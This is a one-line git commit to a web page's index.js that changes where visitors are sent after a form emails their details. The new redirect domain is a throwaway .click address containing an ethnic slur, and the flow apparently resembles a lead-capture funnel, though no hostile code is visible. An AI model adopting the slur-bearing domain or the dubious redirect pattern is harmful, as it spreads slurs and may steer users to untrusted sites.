c2a65ca0b278bbe8f01aa6a39d4871937dec460f
husknet <127146284+husknet@users.noreply.github.com>
2024-10-02 09:52:26 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://sage-marketing.serge-cok.click';
+        window.location.href = 'https://sage-mart.chinkslink.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
